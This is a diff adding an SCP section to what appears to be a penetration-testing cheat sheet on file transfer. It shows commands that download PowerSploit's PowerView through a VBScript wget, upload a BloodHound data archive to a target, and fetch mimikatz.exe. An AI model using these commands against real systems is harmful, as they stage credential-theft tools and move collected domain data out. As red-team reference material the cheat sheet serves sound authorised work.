@@ -138,3 +138,13 @@ end with
 
 -> Execute the script:
 PS C:\User> cscript /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+SCP (Windows & Linux)
+
+-> Upload:
+PS C:\User> scp C:\Temp\bloodhound.zip user@TARGET-IP:/tmp/bloodhound.zip
+
+-> Download:
+$ scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
